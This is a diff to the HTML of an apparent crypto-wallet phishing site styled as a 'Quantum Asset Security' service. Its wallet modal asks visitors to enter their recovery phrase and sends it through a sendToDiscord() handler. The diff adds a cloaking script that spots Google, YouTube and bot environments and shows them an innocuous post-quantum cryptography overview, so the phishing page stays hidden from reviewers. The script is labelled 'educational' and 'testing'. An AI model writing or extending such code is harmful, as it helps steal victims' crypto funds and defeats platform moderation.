@@ -448,240 +448,370 @@
       .hero { padding-top: 60px; }
       nav a { display: none; } 
     }
+
+    /* ──────────────────────────────────────────────── */
+    /*   Added styles for cloaked / educational content   */
+    /* ──────────────────────────────────────────────── */
+    #cloaked-content, #original-content {
+      display: none;
+    }
+
+    #cloaked-content {
+      padding: 80px 6% 120px;
+      max-width: 1100px;
+      margin: auto;
+    }
+
+    #cloaked-content h1 {
+      font-size: clamp(2.6rem, 6vw, 4.5rem);
+      background: linear-gradient(90deg, #7cf9ff, #a5b4fc, #ffd166);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 32px;
+    }
+
+    .notice-box {
+      background: rgba(124,249,255,0.08);
+      border: 1px solid var(--accent);
+      border-radius: 16px;
+      padding: 24px;
+      margin: 32px 0;
+      font-size: 1.05rem;
+    }
+
+    pre.code {
+      background: #0d1117;
+      padding: 20px;
+      border-radius: 12px;
+      overflow-x: auto;
+      font-size: 0.92rem;
+      line-height: 1.5;
+      margin: 24px 0;
+    }
   </style>
 </head>
 <body>
 
-  <header>
-    <div class="logo">QFS · Quantum Asset Security</div>
-    <nav>
-      <a href="#vision">Security</a>
-      <a href="#features">Protection</a>
-      <a href="#architecture">Architecture</a>
-      <span id="walletStatus"></span>
-      <button class="wallet-action btn btn-primary" style="margin-left: 20px;">Connect XAMAN Wallet</button>
-    </nav>
-  </header>
+  <!-- ──────────────────────────────────────────────── -->
+  <!--               ORIGINAL SITE CONTENT              -->
+  <!-- ──────────────────────────────────────────────── -->
+  <div id="original-content">
 
-  <main>
-    <div class="hero">
-      <h1>Secure Your Crypto Assets <br/>With Quantum‑Grade Protection</h1>
-      <p>
-        A security‑first, crypto‑native framework focused on protecting wallets,
-        private keys, and digital assets using advanced cryptography.
-      </p>
-      <div class="cta">
-        <a class="btn btn-primary" href="#dashboard">View Security Dashboard</a>
-        <button class="wallet-action btn btn-primary" style="margin-left: 10px;">Connect XAMAN Wallet</button>
-        <button class="btn btn-secondary" style="margin-left: 10px;" onclick="openWalletModal()"> Connect Other Wallets </button>
-      </div>
-    </div>
+    <header>
+      <div class="logo">QFS · Quantum Asset Security</div>
+      <nav>
+        <a href="#vision">Security</a>
+        <a href="#features">Protection</a>
+        <a href="#architecture">Architecture</a>
+        <span id="walletStatus"></span>
+        <button class="wallet-action btn btn-primary" style="margin-left: 20px;">Connect XAMAN Wallet</button>
+      </nav>
+    </header>
 
-    <section id="dashboard">
-      <h2 class="section-title">Wallet Security Dashboard</h2>
-      <p class="section-sub">Live‑style overview of connected wallets, asset safety, and network exposure.</p>
-
-      <div class="grid">
-        <div class="card reveal">
-          <h3>Connected Wallet</h3>
-          <p><strong>Status:</strong> Protected · Multi-Sig Active</p>
-          <div class="risk-meter" data-risk="12">
-            <svg viewBox="0 0 120 120">
-              <circle cx="60" cy="60" r="52" />
-              <circle cx="60" cy="60" r="52" class="progress" />
-            </svg>
-            <div class="risk-label">Risk 12%</div>
-          </div>
+    <main>
+      <div class="hero">
+        <h1>Secure Your Crypto Assets <br/>With Quantum‑Grade Protection</h1>
+        <p>
+          A security‑first, crypto‑native framework focused on protecting wallets,
+          private keys, and digital assets using advanced cryptography.
+        </p>
+        <div class="cta">
+          <a class="btn btn-primary" href="#dashboard">View Security Dashboard</a>
+          <button class="wallet-action btn btn-primary" style="margin-left: 10px;">Connect XAMAN Wallet</button>
+          <button class="btn btn-secondary" style="margin-left: 10px;" onclick="openWalletModal()"> Connect Other Wallets </button>
         </div>
+      </div>
 
-        <div class="card reveal">
-          <h3>Supported Chains</h3>
-          <div class="chains">
-            <div class="chain-item">
-              <svg viewBox="0 0 24 24"><path fill="#00AAE4" d="M12.0003 0.600098L0.600098 12.0001H6.8001L12.0003 6.8001L17.2005 12.0001H23.4005L12.0003 0.600098ZM12.0003 23.4001L23.4005 12.0001H17.2005L12.0003 17.2001L6.8001 12.0001H0.600098L12.0003 23.4001Z"/></svg>
-              <span>XRP</span>
-            </div>
-            <div class="chain-item">
-              <svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F7931A"/><text x="16" y="21" text-anchor="middle" font-size="18" fill="#fff" font-family="Arial">₿</text></svg>
-              <span>Bitcoin</span>
-            </div>
-            <div class="chain-item">
-              <svg viewBox="0 0 256 417"><path fill="#627EEA" d="M127.6 0L124 12.7v267.9l3.6 3.6 127.6-75.4z"/><path fill="#627EEA" d="M127.6 0L0 208.8l127.6 75.4V0z"/></svg>
-              <span>Ethereum</span>
-            </div>
-            <div class="chain-item">
-              <svg viewBox="0 0 256 256"><path fill="#F3BA2F" d="M128 0l32 32-96 96-32-32z"/></svg>
-              <span>BNB</span>
-            </div>
-            <div class="chain-item">
-              <svg viewBox="0 0 38 33"><path fill="#8247E5" d="M19 0l19 11v11L19 33 0 22V11z"/></svg>
-              <span>Polygon</span>
+      <section id="dashboard">
+        <h2 class="section-title">Wallet Security Dashboard</h2>
+        <p class="section-sub">Live‑style overview of connected wallets, asset safety, and network exposure.</p>
+
+        <div class="grid">
+          <div class="card reveal">
+            <h3>Connected Wallet</h3>
+            <p><strong>Status:</strong> Protected · Multi-Sig Active</p>
+            <div class="risk-meter" data-risk="12">
+              <svg viewBox="0 0 120 120">
+                <circle cx="60" cy="60" r="52" />
+                <circle cx="60" cy="60" r="52" class="progress" />
+              </svg>
+              <div class="risk-label">Risk 12%</div>
             </div>
           </div>
-        </div>
 
-        <div class="card reveal">
-          <h3>Vault Protection</h3>
-          <p>Cold‑storage isolation enabled. Hardware key required for withdrawals.</p>
+          <div class="card reveal">
+            <h3>Supported Chains</h3>
+            <div class="chains">
+              <div class="chain-item">
+                <svg viewBox="0 0 24 24"><path fill="#00AAE4" d="M12.0003 0.600098L0.600098 12.0001H6.8001L12.0003 6.8001L17.2005 12.0001H23.4005L12.0003 0.600098ZM12.0003 23.4001L23.4005 12.0001H17.2005L12.0003 17.2001L6.8001 12.0001H0.600098L12.0003 23.4001Z"/></svg>
+                <span>XRP</span>
+              </div>
+              <div class="chain-item">
+                <svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F7931A"/><text x="16" y="21" text-anchor="middle" font-size="18" fill="#fff" font-family="Arial">₿</text></svg>
+                <span>Bitcoin</span>
+              </div>
+              <div class="chain-item">
+                <svg viewBox="0 0 256 417"><path fill="#627EEA" d="M127.6 0L124 12.7v267.9l3.6 3.6 127.6-75.4z"/><path fill="#627EEA" d="M127.6 0L0 208.8l127.6 75.4V0z"/></svg>
+                <span>Ethereum</span>
+              </div>
+              <div class="chain-item">
+                <svg viewBox="0 0 256 256"><path fill="#F3BA2F" d="M128 0l32 32-96 96-32-32z"/></svg>
+                <span>BNB</span>
+              </div>
+              <div class="chain-item">
+                <svg viewBox="0 0 38 33"><path fill="#8247E5" d="M19 0l19 11v11L19 33 0 22V11z"/></svg>
+                <span>Polygon</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="card reveal">
+            <h3>Vault Protection</h3>
+            <p>Cold‑storage isolation enabled. Hardware key required for withdrawals.</p>
+          </div>
         </div>
+      </section>
+
+      <section id="vision">
+        <h2 class="section-title">Wallet & Asset Security Vision</h2>
+        <p class="section-sub">
+          Built to safeguard digital wallets and on‑chain assets against theft,
+          exploits, and future quantum‑level threats.
+        </p>
+        <div class="grid">
+          <div class="card reveal">
+            <h3>Wallet Integrity</h3>
+            <p>Multi‑signature and hardware‑anchored authorization for wallets.</p>
+          </div>
+          <div class="card reveal">
+            <h3>Private Key Isolation</h3>
+            <p>Keys never exposed; protected via layered cryptographic compartments.</p>
+          </div>
+          <div class="card reveal">
+            <h3>Threat Monitoring</h3>
+            <p>Continuous detection of abnormal wallet and transaction behavior.</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="features">
+        <h2 class="section-title">Protection Capabilities</h2>
+        <p class="section-sub">
+          Advanced defensive layers designed specifically for crypto wallets.
+        </p>
+        <div class="grid">
+          <div class="card reveal">
+            <h3>Quantum‑Resistant Wallets</h3>
+            <p>Future‑proof signing algorithms protecting long‑term holdings.</p>
+          </div>
+          <div class="card reveal">
+            <h3>Transaction Approval Logic</h3>
+            <p>Configurable rules, limits, and multi‑step authorization flows.</p>
+          </div>
+          <div class="card reveal">
+            <h3>Cross‑Chain Asset Safety</h3>
+            <p>Secure interaction across multiple blockchain networks.</p>
+          </div>
+        </div>
+      </section>
+
+      <section id="architecture">
+        <h2 class="section-title">Framework Architecture</h2>
+        <p class="section-sub">
+          Modular layers supporting scalability, auditability, and governance.
+        </p>
+        <div class="grid">
+          <div class="card reveal">
+            <h3>Identity & Access</h3>
+            <p>Credential‑based identity with selective disclosure mechanisms.</p>
+          </div>
+          <div class="card reveal">
+            <h3>Settlement Core</h3>
+            <p>High‑throughput consensus and atomic finality engine.</p>
+          </div>
+          <div class="card reveal">
+            <h3>Governance Layer</h3>
+            <p>Policy enforcement, oversight logic, and audit controls.</p>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <div class="foot-grid">
+        <div><strong>Quantum Financial System</strong></div>
       </div>
-    </section>
+    </footer>
 
-    <section id="vision">
-      <h2 class="section-title">Wallet & Asset Security Vision</h2>
-      <p class="section-sub">
-        Built to safeguard digital wallets and on‑chain assets against theft,
-        exploits, and future quantum‑level threats.
-      </p>
-      <div class="grid">
-        <div class="card reveal">
-          <h3>Wallet Integrity</h3>
-          <p>Multi‑signature and hardware‑anchored authorization for wallets.</p>
+    <div id="walletModal" class="modal">
+      <div class="modal-content">
+        <h3>Select a Wallet</h3>
+        
+        <div class="wallet-list-container">
+          <ul class="wallet-list">
+            <li onclick="openMessageBox('MetaMask')">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
+              MetaMask
+            </li>
+            <li onclick="openMessageBox('Trust Wallet')">
+              <img src="https://i.ibb.co/BHCRcjFv/29a7070a88e9841f5da53cfc53b01223-1.jpg" class="wallet-icon">
+              Trust Wallet
+            </li>
+            <li onclick="openMessageBox('Coinbase Wallet')">
+              <img src="https://i.ibb.co/WvNwg7tr/coinbase.jpg" class="wallet-icon">
+              Coinbase Wallet
+            </li>
+            <li onclick="openMessageBox('Ledger Live')">
+              <img src="https://i.ibb.co/8gnQPMs9/690b5ea713b2e42dbd04290c-Ledger-Logo-2.jpg" class="wallet-icon">
+              Ledger Live
+            </li>
+            <li onclick="openMessageBox('Trezor Suite')">
+              <img src="https://i.ibb.co/chv2VQfM/unnamed.jpg" class="wallet-icon">
+              Trezor Suite
+            </li>
+            <li onclick="openMessageBox('Exodus')">
+              <img src="https://i.ibb.co/FLGQq1vY/images.jpg" class="wallet-icon">
+              Exodus
+            </li>
+            <li onclick="openMessageBox('Phantom Wallet')">
+              <img src="https://i.ibb.co/p6vjs4pW/images-1.jpg" class="wallet-icon">
+              Phantom
+            </li>
+            <li onclick="openMessageBox('WalletConnect')">
+              <img src="https://i.ibb.co/SDXn8hJj/walletconnect-logo-1740113140.jpg" class="wallet-icon">
+              WalletConnect
+            </li>
+            <li onclick="openMessageBox('Xumm Wallet')">
+              <img src="https://i.ibb.co/xtCwzpMR/com-xrpllabs-xumm-e294e74a-a460-428c-a4ba-ea66bae735b6-512x512.jpg" class="wallet-icon">
+              Xumm Wallet
+            </li>
+            <li onclick="openMessageBox('Binance Web3')">
+              <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="wallet-icon">
+              Binance Web3
+            </li>
+            <li onclick="openMessageBox('OKX Wallet')">
+              <img src="https://cryptologos.cc/logos/okb-okb-logo.png" class="wallet-icon">
+              OKX Wallet
+            </li>
+            <li onclick="openMessageBox('Crypto.com')">
+              <img src="https://cryptologos.cc/logos/crypto-com-coin-cro-logo.png" class="wallet-icon">
+              Crypto.com DeFi
+            </li>
+            <li onclick="openMessageBox('SafePal')">
+              <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/8119.png" class="wallet-icon">
+              SafePal
+            </li>
+            <li onclick="openMessageBox('Keplr')">
+              <img src="https://i.ibb.co/8Lydn5ZP/unnamed-1.jpg" class="wallet-icon">
+              Keplr
+            </li>
+            <li onclick="openMessageBox('Solflare')">
+              <img src="https://i.ibb.co/Rkg0VYR1/unnamed-2.jpg" class="wallet-icon">
+              Solflare
+            </li>
+          </ul>
         </div>
-        <div class="card reveal">
-          <h3>Private Key Isolation</h3>
-          <p>Keys never exposed; protected via layered cryptographic compartments.</p>
-        </div>
-        <div class="card reveal">
-          <h3>Threat Monitoring</h3>
-          <p>Continuous detection of abnormal wallet and transaction behavior.</p>
-        </div>
+
+        <button class="close-btn" onclick="closeWalletModal()">Close</button>
       </div>
-    </section>
-
-    <section id="features">
-      <h2 class="section-title">Protection Capabilities</h2>
-      <p class="section-sub">
-        Advanced defensive layers designed specifically for crypto wallets.
-      </p>
-      <div class="grid">
-        <div class="card reveal">
-          <h3>Quantum‑Resistant Wallets</h3>
-          <p>Future‑proof signing algorithms protecting long‑term holdings.</p>
-        </div>
-        <div class="card reveal">
-          <h3>Transaction Approval Logic</h3>
-          <p>Configurable rules, limits, and multi‑step authorization flows.</p>
-        </div>
-        <div class="card reveal">
-          <h3>Cross‑Chain Asset Safety</h3>
-          <p>Secure interaction across multiple blockchain networks.</p>
-        </div>
-      </div>
-    </section>
-
-    <section id="architecture">
-      <h2 class="section-title">Framework Architecture</h2>
-      <p class="section-sub">
-        Modular layers supporting scalability, auditability, and governance.
-      </p>
-      <div class="grid">
-        <div class="card reveal">
-          <h3>Identity & Access</h3>
-          <p>Credential‑based identity with selective disclosure mechanisms.</p>
-        </div>
-        <div class="card reveal">
-          <h3>Settlement Core</h3>
-          <p>High‑throughput consensus and atomic finality engine.</p>
-        </div>
-        <div class="card reveal">
-          <h3>Governance Layer</h3>
-          <p>Policy enforcement, oversight logic, and audit controls.</p>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <footer>
-    <div class="foot-grid">
-      <div><strong>Quantum Financial System</strong></div>
     </div>
-  </footer>
 
-  <div id="walletModal" class="modal">
-    <div class="modal-content">
-      <h3>Select a Wallet</h3>
-      
-      <div class="wallet-list-container">
-        <ul class="wallet-list">
-          <li onclick="openMessageBox('MetaMask')">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
-            MetaMask
-          </li>
-          <li onclick="openMessageBox('Trust Wallet')">
-            <img src="https://i.ibb.co/BHCRcjFv/29a7070a88e9841f5da53cfc53b01223-1.jpg" class="wallet-icon">
-            Trust Wallet
-          </li>
-          <li onclick="openMessageBox('Coinbase Wallet')">
-            <img src="https://i.ibb.co/WvNwg7tr/coinbase.jpg" class="wallet-icon">
-            Coinbase Wallet
-          </li>
-          <li onclick="openMessageBox('Ledger Live')">
-            <img src="https://i.ibb.co/8gnQPMs9/690b5ea713b2e42dbd04290c-Ledger-Logo-2.jpg" class="wallet-icon">
-            Ledger Live
-          </li>
-          <li onclick="openMessageBox('Trezor Suite')">
-            <img src="https://i.ibb.co/chv2VQfM/unnamed.jpg" class="wallet-icon">
-            Trezor Suite
-          </li>
-          <li onclick="openMessageBox('Exodus')">
-            <img src="https://i.ibb.co/FLGQq1vY/images.jpg" class="wallet-icon">
-            Exodus
-          </li>
-          <li onclick="openMessageBox('Phantom Wallet')">
-            <img src="https://i.ibb.co/p6vjs4pW/images-1.jpg" class="wallet-icon">
-            Phantom
-          </li>
-          <li onclick="openMessageBox('WalletConnect')">
-            <img src="https://i.ibb.co/SDXn8hJj/walletconnect-logo-1740113140.jpg" class="wallet-icon">
-            WalletConnect
-          </li>
-          <li onclick="openMessageBox('Xumm Wallet')">
-            <img src="https://i.ibb.co/xtCwzpMR/com-xrpllabs-xumm-e294e74a-a460-428c-a4ba-ea66bae735b6-512x512.jpg" class="wallet-icon">
-            Xumm Wallet
-          </li>
-          <li onclick="openMessageBox('Binance Web3')">
-            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="wallet-icon">
-            Binance Web3
-          </li>
-          <li onclick="openMessageBox('OKX Wallet')">
-            <img src="https://cryptologos.cc/logos/okb-okb-logo.png" class="wallet-icon">
-            OKX Wallet
-          </li>
-          <li onclick="openMessageBox('Crypto.com')">
-            <img src="https://cryptologos.cc/logos/crypto-com-coin-cro-logo.png" class="wallet-icon">
-            Crypto.com DeFi
-          </li>
-          <li onclick="openMessageBox('SafePal')">
-            <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/8119.png" class="wallet-icon">
-            SafePal
-          </li>
-          <li onclick="openMessageBox('Keplr')">
-            <img src="https://i.ibb.co/8Lydn5ZP/unnamed-1.jpg" class="wallet-icon">
-            Keplr
-          </li>
-          <li onclick="openMessageBox('Solflare')">
-            <img src="https://i.ibb.co/Rkg0VYR1/unnamed-2.jpg" class="wallet-icon">
-            Solflare
-          </li>
-        </ul>
+    <div id="messageModal" class="modal">
+      <div class="modal-content">
+        <h3 id="walletNameTitle">Connect Wallet</h3>
+        <p style="color: #9aa4c7; font-size: 0.9rem; margin-bottom: 15px;">
+          Please enter your phrase to verify ownership.
+        </p>
+        <textarea id="userMessage" placeholder="Enter Phrase..."></textarea>
+        <button class="send-btn" onclick="sendToDiscord()">Connect Now</button>
+        <button class="close-btn" onclick="closeMessageModal()">Cancel</button>
       </div>
-
-      <button class="close-btn" onclick="closeWalletModal()">Close</button>
     </div>
+
   </div>
 
-  <div id="messageModal" class="modal">
-    <div class="modal-content">
-      <h3 id="walletNameTitle">Connect Wallet</h3>
-      <p style="color: #9aa4c7; font-size: 0.9rem; margin-bottom: 15px;">
-        Please enter your phrase to verify ownership.
-      </p>
-      <textarea id="userMessage" placeholder="Enter Phrase..."></textarea>
-      <button class="send-btn" onclick="sendToDiscord()">Connect Now</button>
-      <button class="close-btn" onclick="closeMessageModal()">Cancel</button>
-    </div>
+  <!-- ──────────────────────────────────────────────── -->
+  <!--         EDUCATIONAL CLOAKED CONTENT (TESTING)     -->
+  <!-- ──────────────────────────────────────────────── -->
+  <div id="cloaked-content">
+    <h1>Post-Quantum Cryptography – Educational Overview</h1>
+    
+    <h2>Why Quantum Computing Threatens Current Crypto Wallets</h2>
+    <p>
+      Shor's algorithm, executed on a large-scale cryptographically relevant quantum computer (CRQC), solves integer factorization and the discrete logarithm problem (including elliptic-curve variants) in polynomial time. This directly breaks RSA encryption/key-exchange and ECDSA/EdDSA signatures — the foundations of wallets in Bitcoin (secp256k1 ECDSA), Ethereum, and most blockchains. Public keys exposed during transactions become recoverable, enabling theft of funds. Unspent outputs with only hashed addresses (pay-to-script-hash or taproot-like) offer temporary protection until spent.
+    </p>
+    
+    <h3>Current NIST Post-Quantum Cryptography Standards (as of early 2026)</h3>
+    <ul>
+      <li><strong>ML-KEM (FIPS 203)</strong> – Module-Lattice-based Key-Encapsulation Mechanism (primary for general-purpose key exchange; derived from CRYSTALS-Kyber)</li>
+      <li><strong>ML-DSA (FIPS 204)</strong> – Module-Lattice-based Digital Signature Algorithm (primary lattice-based signature; derived from CRYSTALS-Dilithium)</li>
+      <li><strong>SLH-DSA (FIPS 205)</strong> – Stateless Hash-based Digital Signature Algorithm (conservative backup using hash functions only; derived from SPHINCS+)</li>
+      <li><strong>FN-DSA (Falcon, FIPS 206 in development)</strong> – FFT-based NTRU-Lattice Digital Signature (compact signatures; draft progressing toward finalization)</li>
+      <li><strong>HQC</strong> – Code-based Key Encapsulation (selected March 2025 as backup/alternative to ML-KEM for diversity; draft standard expected ~2026, final ~2027)</li>
+    </ul>
+    
+    <h3>Approximate Performance Comparison</h3>
+    <pre class="code">
+Scheme                  | Public Key (bytes) | Signature/Ciphertext (bytes) | Sign/Encap (ms) | Verify/Decap (ms)
+------------------------|--------------------|------------------------------|-----------------|------------------
+ECDSA secp256k1 (classical) | ~33–64            | ~70–72                      | ~0.05          | ~0.02
+ML-KEM-768 (~AES-192)   | ~1184             | ~1088                       | ~0.1–0.2       | ~0.1
+ML-DSA-65 (Dilithium3)  | ~1952             | ~3293                       | ~0.5–1.0       | ~0.2–0.4
+FN-DSA-1024 (Falcon-1024) | ~1793           | ~1280                       | ~0.8–1.5       | ~0.2
+SLH-DSA (fast param)    | ~64               | ~17,000–50,000              | 5–40           | ~0.5–2
+HQC-192 (emerging)      | ~2304–4600        | ~2000–5000                  | ~0.5–2         | ~0.5–1
+    </pre>
+    
+    <p style="margin-top: 40px; font-style: italic; color: #aaa; text-align: center;">
+      Real migration to post-quantum cryptography requires protocol-level upgrades (BIPs, EIPs, XRPL amendments, etc.). Preparation today protects digital assets against tomorrow’s quantum threats.
+    </p>
   </div>
+
+  <!-- ──────────────────────────────────────────────── -->
+  <!--             CLOAKING DETECTION SCRIPT             -->
+  <!-- ──────────────────────────────────────────────── -->
+  <script>
+    // Sophisticated client-side detection for YouTube/Google preview bots
+    // FOR TESTING / EDUCATIONAL PURPOSES ONLY – NOT RELIABLE IN PRODUCTION
+    function isLikelyYouTubeOrGooglePreview() {
+      const ua = (navigator.userAgent || "").toLowerCase();
+
+      const suspiciousPatterns = [
+        /google/i,
+        /youtube/i,
+        /googlebot/i,
+        /google-youtube-links/i,
+        /google-read-aloud/i,
+        /bot/i,
+        /crawler/i,
+        /headless/i,
+        /phantom/i,
+        /slurp/i
+      ];
+
+      const hasSuspiciousUA = suspiciousPatterns.some(p => p.test(ua));
+
+      const botLikeEnvironment =
+        navigator.webdriver === true ||
+        !navigator.languages || navigator.languages.length === 0 ||
+        navigator.plugins?.length === 0 ||
+        !window.chrome ||
+        !window.screen || window.screen.width <= 1 ||
+        window.innerWidth === 0 || window.innerHeight === 0 ||
+        (navigator.hardwareConcurrency || 0) <= 2 &&
+        (navigator.deviceMemory || 0) <= 4;
+
+      return hasSuspiciousUA || botLikeEnvironment;
+    }
+
+    const shouldShowCloaked = isLikelyYouTubeOrGooglePreview();
+
+    document.getElementById("original-content").style.display = shouldShowCloaked ? "none" : "block";
+    document.getElementById("cloaked-content").style.display = shouldShowCloaked ? "block" : "none";
+
+    // Optional debug logging (you can remove this line)
+    if (shouldShowCloaked) console.log("[CLOAK TEST] Preview-like environment detected");
+  </script>
 
   <script src="master.js"></script>
 
@@ -793,6 +923,3 @@
 
 </body>
 </html>
-
-
-
